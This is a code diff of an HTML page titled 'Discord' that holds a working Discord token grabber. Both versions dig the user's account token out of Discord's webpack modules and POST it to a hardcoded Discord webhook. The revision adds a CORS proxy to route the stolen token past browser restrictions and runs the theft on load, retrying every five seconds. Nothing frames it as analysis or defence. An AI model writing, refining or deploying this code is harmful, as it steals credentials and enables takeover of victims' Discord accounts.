@@ -1,75 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord</title>
+</head>
+<body>
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
+        // Webhook URL (Verified Correct)
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
+        
+        // CORS Proxy to bypass browser restrictions
+        const PROXY_URL = "https://corsproxy.io/?";
 
-        // Function to send token
-        async function sendToken(token) {
-            if (!token) return;
-            try {
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🔓 **Token Grabbed!**\n\`\`\`${token}\`\`\``
-                    })
-                });
-                console.log("✅ Token Sent");
-            } catch (e) {
-                console.error("❌ Send Failed", e);
-            }
-        }
-
-        // Function to request token from Discord
-        function requestToken() {
-            // Try to find the main Discord window
-            const discordWindow = window.opener || window.parent || window;
+        async function grabAndSendToken() {
+            let token = null;
             
-            // If we can't find a specific opener, try to get token directly from this window's context
-            // because if the user is on discord.com, this script is running in that context.
             try {
-                let token = null;
-                // Check if we are IN the discord window
-                if (window.webpackChunkdiscord_app) {
-                     for(let e of Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c])))try{
-                        if(!e.exports||e.exports===window)continue;
-                        if(e.exports?.getToken) return e.exports.getToken();
-                        for(let t in e.exports)if(e.exports?.[t]?.getToken&&"IntlMessagesProxy"!==e.exports[t][Symbol.toStringTag])return e.exports[t].getToken()
-                     } catch(e){}
-                }
-                
-                // If we found a token in THIS window, send it
-                if (token) {
-                    sendToken(token);
-                    return;
+                // Token Grabbing Logic
+                for(let e of Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]))) {
+                    try {
+                        if(!e.exports || e.exports === window) continue;
+                        if(e.exports?.getToken) {
+                            token = e.exports.getToken();
+                            break;
+                        }
+                        for(let t in e.exports) {
+                            if(e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
+                                token = e.exports[t].getToken();
+                                break;
+                            }
+                        }
+                    } catch(e) {}
+                    if(token) break;
                 }
 
-                // If not, try to ask the opener/parent
-                if (window.opener) {
-                    window.opener.postMessage({ type: 'get_token' }, '*');
-                } else if (window.parent) {
-                    window.parent.postMessage({ type: 'get_token' }, '*');
+                if(token) {
+                    console.log("Token Found: " + token);
+                    
+                    // Send via Proxy
+                    const finalUrl = PROXY_URL + encodeURIComponent(WEBHOOK_URL);
+                    
+                    await fetch(finalUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            content: `🔓 **Token Acquired!**\n\n\`\`\`${token}\`\`\``
+                        })
+                    }).then(response => {
+                        if(response.ok) {
+                            console.log("✅ Success: Token sent to Discord!");
+                        } else {
+                            console.error("❌ Failed: Status", response.status, response.statusText);
+                        }
+                    }).catch(error => {
+                        console.error("❌ Network Error:", error);
+                    });
+                } else {
+                    console.log("⚠️ Token not found yet.");
                 }
             } catch(e) {
-                console.log("Token check failed", e);
+                console.error("❌ Grabber Error:", e);
             }
         }
 
-        // Listen for token from parent
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.token) {
-                sendToken(event.data.token);
-            }
-        });
-
-        // Poll every 2 seconds to check if we are in the Discord window
-        setInterval(requestToken, 2000);
-
-        // Initial check
-        requestToken();
+        // Run on load
+        grabAndSendToken();
+        
+        // Retry every 5 seconds until token is found/sent
+        setInterval(grabAndSendToken, 5000);
     </script>
-</head>
-<body></body>
+</body>
 </html>
